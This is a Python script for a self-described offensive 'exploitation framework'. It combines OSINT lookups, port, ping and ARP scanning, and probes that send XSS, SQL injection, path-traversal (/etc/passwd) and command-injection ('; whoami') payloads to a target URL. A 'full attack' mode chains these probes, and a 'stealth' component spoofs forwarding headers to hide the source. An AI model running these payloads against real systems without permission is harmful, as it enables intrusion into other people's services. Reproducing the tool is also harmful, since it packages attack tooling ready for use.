
#!/usr/bin/env python3
"""
ANUBIZ_EXPLT v1.0 - Multi-Vector Advanced Exploitation Framework
Professional Security Testing - Zero Trace - Military Grade

Author: F1REW0LF
License: MIT
"""

import sys
import os
import re
import json
import time
import socket
import random
import hashlib
import base64
import threading
import queue
import subprocess
import signal
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.layers.l2 import ARP, Ether
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

VERSION = "1.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    NEON = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    MAGENTA = '\033[95m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.GOLD}{Colors.BOLD}    █████╗ ███╗   ██╗██╗   ██╗██████╗ ██╗███████╗    ███████╗██╗  ██╗██████╗ ██╗     
    ██╔══██╗████╗  ██║██║   ██║██╔══██╗██║╚══███╔╝    ██╔════╝╚██╗██╔╝██╔══██╗██║     
    ███████║██╔██╗ ██║██║   ██║██████╔╝██║  ███╔╝     █████╗   ╚███╔╝ ██████╔╝██║     
    ██╔══██║██║╚██╗██║██║   ██║██╔══██╗██║ ███╔╝      ██╔══╝   ██╔██╗ ██╔═══╝ ██║     
    ██║  ██║██║ ╚████║╚██████╔╝██████╔╝██║███████╗    ███████╗██╔╝ ██╗██║     ███████╗
    ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚═╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝
                                                   
{Colors.NEON}          ULTIMATE v{VERSION} - MULTI-VECTOR EXPLOITATION{Colors.WHITE}
{Colors.CYAN}    Professional Security Testing - Zero Trace{Colors.WHITE}
{Colors.YELLOW}    Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
    """
    print(banner)
    print("=" * 80)

# ==================== STEALTH ENGINE ====================
class StealthEngine:
    @staticmethod
    def random_ip() -> str:
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    
    @staticmethod
    def random_mac() -> str:
        return f"02:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"
    
    @staticmethod
    def random_user_agent() -> str:
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0 Safari/537.36',
        ]
        return random.choice(agents)
    
    @staticmethod
    def random_headers() -> Dict:
        return {
            'User-Agent': StealthEngine.random_user_agent(),
            'X-Forwarded-For': StealthEngine.random_ip(),
            'X-Real-IP': StealthEngine.random_ip(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        }
    
    @staticmethod
    def delay():
        time.sleep(random.uniform(0.1, 0.5))

# ==================== OSINT ENGINE ====================
class OSINTEngine:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def domain_info(self, domain: str) -> Dict:
        cprint("[OSINT] Gathering domain info...", Colors.BLUE)
        result = {'domain': domain, 'ip': None, 'whois': None, 'subdomains': []}
        
        try:
            result['ip'] = socket.gethostbyname(domain)
            cprint(f"[+] IP: {result['ip']}", Colors.GREEN)
        except:
            pass
        
        try:
            import whois
            w = whois.whois(domain)
            result['whois'] = {
                'registrar': w.registrar,
                'creation_date': str(w.creation_date),
                'expiration_date': str(w.expiration_date),
                'name_servers': w.name_servers
            }
            cprint(f"[+] WHOIS: {w.registrar}", Colors.GREEN)
        except:
            pass
        
        common = ['www', 'mail', 'admin', 'api', 'dev', 'test', 'staging', 'prod', 'app']
        for sub in common:
            try:
                socket.gethostbyname(f"{sub}.{domain}")
                result['subdomains'].append(f"{sub}.{domain}")
                cprint(f"[+] Subdomain: {sub}.{domain}", Colors.GREEN)
            except:
                pass
        
        return result
    
    def ip_info(self, ip: str) -> Dict:
        cprint("[OSINT] Gathering IP info...", Colors.BLUE)
        result = {'ip': ip, 'geo': {}, 'reverse': []}
        
        try:
            response = self.session.get(f"http://ip-api.com/json/{ip}")
            if response.status_code == 200:
                data = response.json()
                result['geo'] = {
                    'country': data.get('country'),
                    'city': data.get('city'),
                    'isp': data.get('isp'),
                    'org': data.get('org')
                }
                cprint(f"[+] Country: {data.get('country')}", Colors.GREEN)
                cprint(f"[+] ISP: {data.get('isp')}", Colors.GREEN)
        except:
            pass
        
        try:
            import dns.resolver
            answers = dns.resolver.resolve(ip, 'PTR')
            for rdata in answers:
                result['reverse'].append(str(rdata))
                cprint(f"[+] Reverse: {rdata}", Colors.GREEN)
        except:
            pass
        
        return result
    
    def email_breach(self, email: str) -> Dict:
        cprint("[OSINT] Checking email breaches...", Colors.BLUE)
        result = {'email': email, 'breaches': []}
        
        try:
            response = self.session.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}")
            if response.status_code == 200:
                data = response.json()
                for breach in data:
                    result['breaches'].append({
                        'name': breach.get('Name'),
                        'date': breach.get('BreachDate')
                    })
                    cprint(f"[!] Breach: {breach.get('Name')}", Colors.RED)
            else:
                cprint("[+] No breaches found", Colors.GREEN)
        except:
            pass
        
        return result

# ==================== EXPLOIT ENGINE ====================
class ExploitEngine:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.stealth = StealthEngine()
    
    def xss_scan(self, url: str) -> List[Dict]:
        cprint("[XSS] Scanning for XSS...", Colors.YELLOW)
        vulns = []
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<svg onload=alert(1)>"
        ]
        
        for payload in payloads:
            try:
                response = self.session.get(f"{url}?x={payload}", timeout=5)
                if payload in response.text:
                    vulns.append({'url': url, 'payload': payload})
                    cprint(f"[!] XSS found", Colors.RED)
            except:
                pass
        
        return vulns
    
    def sqli_scan(self, url: str) -> List[Dict]:
        cprint("[SQLI] Scanning for SQL Injection...", Colors.YELLOW)
        vulns = []
        payloads = ["'", "' OR '1'='1", "' AND 1=1--", "' AND SLEEP(5)--"]
        
        for payload in payloads:
            try:
                response = self.session.get(f"{url}?id={payload}", timeout=5)
                if 'mysql' in response.text.lower() or 'syntax' in response.text.lower():
                    vulns.append({'url': url, 'payload': payload})
                    cprint(f"[!] SQLi found", Colors.RED)
            except:
                pass
        
        return vulns
    
    def lfi_scan(self, url: str) -> List[Dict]:
        cprint("[LFI] Scanning for LFI...", Colors.YELLOW)
        vulns = []
        payloads = ['../../../../etc/passwd', '../../../etc/passwd', '../../etc/passwd']
        
        for payload in payloads:
            try:
                response = self.session.get(f"{url}?file={payload}", timeout=5)
                if 'root:' in response.text or 'bin:' in response.text:
                    vulns.append({'url': url, 'payload': payload})
                    cprint(f"[!] LFI found", Colors.RED)
            except:
                pass
        
        return vulns
    
    def rce_scan(self, url: str) -> List[Dict]:
        cprint("[RCE] Scanning for RCE...", Colors.YELLOW)
        vulns = []
        payloads = ['; whoami', '| whoami', '|| whoami', '&& whoami']
        
        for payload in payloads:
            try:
                response = self.session.get(f"{url}?cmd={payload}", timeout=5)
                if 'uid=' in response.text or 'id=' in response.text:
                    vulns.append({'url': url, 'payload': payload})
                    cprint(f"[!] RCE found", Colors.RED)
            except:
                pass
        
        return vulns

# ==================== NETWORK ENGINE ====================
class NetworkEngine:
    def __init__(self):
        self.stealth = StealthEngine()
    
    def port_scan(self, target: str, ports: List[int] = None) -> List[int]:
        cprint("[SCAN] Scanning ports...", Colors.BLUE)
        
        if not ports:
            ports = [21, 22, 23, 25, 53, 80, 135, 139, 443, 445, 3389, 8080, 8443]
        
        open_ports = []
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(self._check_port, target, p): p for p in ports}
            for future in as_completed(futures):
                if future.result():
                    open_ports.append(futures[future])
                    cprint(f"[+] Port {futures[future]} open", Colors.GREEN)
        
        return open_ports
    
    def _check_port(self, target: str, port: int) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def ping_scan(self, network: str) -> List[str]:
        cprint("[SCAN] Ping scanning network...", Colors.BLUE)
        
        hosts = []
        base = network.split('/')[0].rsplit('.', 1)[0]
        
        def ping(ip):
            try:
                result = subprocess.run(['ping', '-c', '1', '-W', '1', ip], 
                                       capture_output=True)
                if result.returncode == 0:
                    hosts.append(ip)
                    cprint(f"[+] {ip} alive", Colors.GREEN)
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(ping, [f"{base}.{i}" for i in range(1, 255)])
        
        return hosts
    
    def arp_scan(self, network: str) -> List[Dict]:
        if not SCAPY_AVAILABLE:
            cprint("[!] Scapy not available", Colors.RED)
            return []
        
        cprint("[SCAN] ARP scanning network...", Colors.BLUE)
        
        devices = []
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), 
                         timeout=3, verbose=False)
            for sent, received in ans:
                devices.append({'ip': received.psrc, 'mac': received.hwsrc})
                cprint(f"[+] {received.psrc} - {received.hwsrc}", Colors.GREEN)
        except:
            pass
        
        return devices

# ==================== MAIN FRAMEWORK ====================
class AnubizExplt:
    def __init__(self):
        self.osint = OSINTEngine()
        self.exploit = ExploitEngine()
        self.network = NetworkEngine()
        self.results = {}
        self.running = True
        
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        cprint("\n[!] Shutting down...", Colors.RED)
        self.running = False
        sys.exit(0)
    
    def show_menu(self):
        print(f"""
{Colors.BLUE}{'='*60}{Colors.WHITE}
{Colors.BOLD}ANUBIZ_EXPLT - Attack Menu{Colors.WHITE}
{Colors.BLUE}{'='*60}{Colors.WHITE}
[1]  OSINT - Domain Info
[2]  OSINT - IP Info
[3]  OSINT - Email Breach Check
[4]  Network - Port Scan
[5]  Network - Ping Scan
[6]  Network - ARP Scan
[7]  Exploit - XSS Scan
[8]  Exploit - SQLi Scan
[9]  Exploit - LFI Scan
[10] Exploit - RCE Scan
[11] Full Attack (All Vectors)
[12] Show Results
[13] Exit
""")
    
    def domain_osint(self):
        domain = input("[>] Domain: ").strip()
        self.results['domain'] = self.osint.domain_info(domain)
    
    def ip_osint(self):
        ip = input("[>] IP: ").strip()
        self.results['ip'] = self.osint.ip_info(ip)
    
    def email_osint(self):
        email = input("[>] Email: ").strip()
        self.results['email'] = self.osint.email_breach(email)
    
    def port_scan(self):
        target = input("[>] Target IP: ").strip()
        self.results['ports'] = self.network.port_scan(target)
    
    def ping_scan(self):
        network = input("[>] Network (192.168.1.0/24): ").strip() or "192.168.1.0/24"
        self.results['hosts'] = self.network.ping_scan(network)
    
    def arp_scan(self):
        network = input("[>] Network (192.168.1.0/24): ").strip() or "192.168.1.0/24"
        self.results['arp'] = self.network.arp_scan(network)
    
    def xss_scan(self):
        url = input("[>] URL: ").strip()
        self.results['xss'] = self.exploit.xss_scan(url)
    
    def sqli_scan(self):
        url = input("[>] URL: ").strip()
        self.results['sqli'] = self.exploit.sqli_scan(url)
    
    def lfi_scan(self):
        url = input("[>] URL: ").strip()
        self.results['lfi'] = self.exploit.lfi_scan(url)
    
    def rce_scan(self):
        url = input("[>] URL: ").strip()
        self.results['rce'] = self.exploit.rce_scan(url)
    
    def full_attack(self):
        cprint("\n[FULL] Executing full attack chain...", Colors.RED, bold=True)
        
        target = input("[>] Target IP/Domain: ").strip()
        
        # OSINT
        if re.match(r'^[\d.]+$', target):
            self.results['ip'] = self.osint.ip_info(target)
        else:
            self.results['domain'] = self.osint.domain_info(target)
        
        # Network
        self.results['ports'] = self.network.port_scan(target)
        
        # Exploit (if web)
        if self.results.get('ports') and 80 in self.results['ports']:
            url = f"http://{target}"
            self.results['xss'] = self.exploit.xss_scan(url)
            self.results['sqli'] = self.exploit.sqli_scan(url)
            self.results['lfi'] = self.exploit.lfi_scan(url)
            self.results['rce'] = self.exploit.rce_scan(url)
        
        cprint("\n[+] Full attack complete!", Colors.GREEN)
    
    def show_results(self):
        print("\n" + "="*60)
        cprint(" RESULTS", Colors.PURPLE, bold=True)
        print("="*60)
        
        if not self.results:
            cprint("[!] No results", Colors.YELLOW)
            return
        
        for key, value in self.results.items():
            if value:
                cprint(f"\n[{key.upper()}]", Colors.CYAN)
                if isinstance(value, list):
                    for item in value[:10]:
                        if isinstance(item, dict):
                            print(json.dumps(item, indent=2))
                        else:
                            print(f"  - {item}")
                elif isinstance(value, dict):
                    for k, v in value.items():
                        print(f"  {k}: {v}")
                else:
                    print(f"  {value}")
        
        print("="*60)
    
    def run(self):
        print_banner()
        cprint("[*] ANUBIZ_EXPLT - Multi-Vector Exploitation Framework", Colors.CYAN)
        cprint("[*] Zero Trace - Military Grade", Colors.DIM)
        
        while self.running:
            self.show_menu()
            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
            
            if choice == '1': self.domain_osint()
            elif choice == '2': self.ip_osint()
            elif choice == '3': self.email_osint()
            elif choice == '4': self.port_scan()
            elif choice == '5': self.ping_scan()
            elif choice == '6': self.arp_scan()
            elif choice == '7': self.xss_scan()
            elif choice == '8': self.sqli_scan()
            elif choice == '9': self.lfi_scan()
            elif choice == '10': self.rce_scan()
            elif choice == '11': self.full_attack()
            elif choice == '12': self.show_results()
            elif choice == '13':
                cprint("[*] Exiting...", Colors.GREEN)
                break
            else:
                cprint("[-] Invalid selection", Colors.RED)

# ==================== MAIN ====================
def main():
    parser = argparse.ArgumentParser(
        description="ANUBIZ_EXPLT - Multi-Vector Exploitation Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 anubiz_explt.py
  python3 anubiz_explt.py --target example.com
  python3 anubiz_explt.py --target 192.168.1.1 --full
        """
    )
    
    parser.add_argument("-t", "--target", help="Target IP or domain")
    parser.add_argument("--full", action="store_true", help="Full attack")
    parser.add_argument("--scan", action="store_true", help="Port scan only")
    parser.add_argument("--osint", action="store_true", help="OSINT only")
    
    args = parser.parse_args()
    
    tool = AnubizExplt()
    
    if args.target and args.full:
        print_banner()
        tool.results['target'] = args.target
        if re.match(r'^[\d.]+$', args.target):
            tool.results['ip'] = tool.osint.ip_info(args.target)
        else:
            tool.results['domain'] = tool.osint.domain_info(args.target)
        tool.results['ports'] = tool.network.port_scan(args.target)
        if 80 in tool.results['ports']:
            url = f"http://{args.target}"
            tool.results['xss'] = tool.exploit.xss_scan(url)
            tool.results['sqli'] = tool.exploit.sqli_scan(url)
            tool.results['lfi'] = tool.exploit.lfi_scan(url)
            tool.results['rce'] = tool.exploit.rce_scan(url)
        tool.show_results()
    
    elif args.target and args.scan:
        print_banner()
        tool.results['ports'] = tool.network.port_scan(args.target)
        tool.show_results()
    
    elif args.target and args.osint:
        print_banner()
        if re.match(r'^[\d.]+$', args.target):
            tool.results['ip'] = tool.osint.ip_info(args.target)
        else:
            tool.results['domain'] = tool.osint.domain_info(args.target)
        tool.show_results()
    
    else:
        tool.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
